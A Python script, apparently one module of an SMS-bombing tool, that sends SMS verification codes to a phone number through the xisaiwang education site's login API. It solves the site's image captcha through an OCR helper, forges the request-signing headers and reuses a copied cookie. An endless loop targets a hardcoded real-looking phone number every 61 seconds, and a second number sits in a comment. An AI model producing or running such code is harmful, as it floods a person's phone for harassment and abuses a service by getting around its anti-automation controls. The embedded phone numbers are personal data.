import time

import requests
import sys
sys.path.append(r'../')
import tools


def xisai(phoneNum):
    result = tools.randomNum()
    url = 'https://base.xisaiwang.cn/verify/code/r/image.do?key='+result
    headers ={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53'}
    r = requests.get(url, headers=headers).content
    with open('yzm.jpg',mode='wb') as f:
        f.write(r)

    code = tools.base64_api('yzm.jpg')
    print("希赛识别的验证码为：",code)


    url2 = 'https://wangxiao.xisaiwang.com/ucenterapi/phoneLogin/sms/send.do'
    pkey = tools.generate_uuid(8,2)


    data2={"phone": phoneNum,
    "imgCode": code,
    "imgKey": result,
    "pkey": pkey,
    "sk": "phone"}

    sscc2 ='imgCode='+code+'&imgKey='+result+'&phone='+phoneNum+'&pkey='+pkey+'&sk=phone'
    sid = tools.randomNumchart()
    print("希赛随机的sid：", sid)
    print("希赛随机的sscc2：", sscc2[::3])
    print("sscc：", tools.toolmd5(sid+phoneNum))
    headers2 ={
       'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'clientType':'PC',
        'Connection':'keep-alive',
        'Content-Length':'69',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
       'Cookie':'mddcid=1708936400746ryDYOQ; _sid_=518fca17d6ff7f8b100ddd909f0b0625; Hm_lvt_4b9f46d3a269fb3925580a1827143bfb=1714462696; enterPage=https%3A%2F%2Fwangxiao.xisaiwang.com%2Fucenter2%2Flogin.html%3FcookieSync%3Dreferrer~https%253A%252F%252Fwww.educity.cn%252Ferror%252F500.html%2524enterPage~https%253A%252F%252Fwww.educity.cn%252Ferror%252F500.html%2524mddcid~1708936400746ryDYOQ%2524fromUrl~https%253A%252F%252Fwww.educity.cn%252Ferror%252F500.html; enterPageReferrer=https%3A%2F%2Fwww.educity.cn%2F; referrer=https%3A%2F%2Fwww.educity.cn%2F; mddsync=1; mddldyurl=https%3A%2F%2Fwangxiao.xisaiwang.com%2Fucenter2%2Flogin.html%3FcookieSync%3Dreferrer~https%253A%252F%252Fwww.educity.cn%252Ferror%252F500.html%2524enterPage~https%253A%252F%252Fwww.educity.cn%252Ferror%252F500.html%2524mddcid~1708936400746ryDYOQ%2524fromUrl~https%253A%252F%252Fwww.educity.cn%252Ferror%252F500.html; fromUrl=https%3A%2F%2Fwww.educity.cn%2F; Hm_lpvt_4b9f46d3a269fb3925580a1827143bfb=1714462733',
        'Host':'wangxiao.xisaiwang.com',
        'Origin':'https://wangxiao.xisaiwang.com',
        'Referer':'https://wangxiao.xisaiwang.com/ucenter2/register.html',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'sid':sid,
        'sscc':tools.toolmd5(sid+phoneNum),
        'sscc2':sscc2[::3],
        'TE':'trailers',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'}

    r = requests.post(url2, headers=headers2,data=data2,)
    print('希赛结束：',phoneNum,r.text)
    print("\n")
while 1:
    xisai('17311067255')
    time.sleep(61)
# xisai('18728773736')
